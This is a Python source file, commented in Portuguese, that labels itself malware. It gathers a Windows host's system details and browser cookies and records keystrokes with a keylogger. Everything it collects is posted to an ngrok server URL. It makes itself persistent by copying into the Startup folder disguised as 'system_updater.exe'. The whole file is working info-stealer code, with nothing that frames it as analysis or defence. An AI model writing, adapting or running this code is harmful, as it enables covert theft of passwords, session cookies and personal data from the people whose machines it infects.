import os
import requests
import json
import platform
from pynput.keyboard import Listener
import browser_cookie3  # Para capturar cookies do navegador
import time

# Configuração do servidor
SERVER_URL = "https://c16e-200-103-154-30.ngrok-free.app"

# Lista para armazenar dados do keylogger antes de enviar
key_logs = []

# Função para enviar dados ao servidor
def send_data(data_type, data):
    try:
        payload = {
            "machine": platform.node(),
            "os": platform.system(),
            "type": data_type,
            "data": data
        }
        response = requests.post(SERVER_URL, json=payload)
        print(f"Enviado: {data_type}, Status: {response.status_code}")
    except Exception as e:
        print(f"Erro ao enviar: {e}")

# Coletar cookies dos navegadores
def capture_cookies():
    try:
        cookies = {}
        cj = browser_cookie3.load()
        for cookie in cj:
            cookies[cookie.name] = cookie.value
        send_data("cookies", cookies)
    except Exception as e:
        print(f"Erro ao capturar cookies: {e}")

# Coletar informações sobre o sistema
def capture_system_info():
    system_info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "version": platform.version(),
        "architecture": platform.architecture(),
        "processor": platform.processor()
    }
    send_data("system_info", system_info)

# Keylogger para capturar teclas digitadas
def on_press(key):
    global key_logs
    try:
        key_logs.append(str(key).replace("'", ""))
        if len(key_logs) >= 50:  # Envia os logs a cada 50 teclas
            send_data("keylogger", "".join(key_logs))
            key_logs = []
    except Exception as e:
        print(f"Erro no keylogger: {e}")

# Persistência no sistema
def create_persistence():
    try:
        startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        script_path = os.path.abspath(__file__)
        target_path = os.path.join(startup_folder, "system_updater.exe")
        if not os.path.exists(target_path):
            os.system(f'copy "{script_path}" "{target_path}"')
            print("Persistência criada.")
    except Exception as e:
        print(f"Erro na persistência: {e}")

# Início do malware
def main():
    capture_system_info()
    capture_cookies()

    # Configura o listener de teclado
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    create_persistence()
    main()
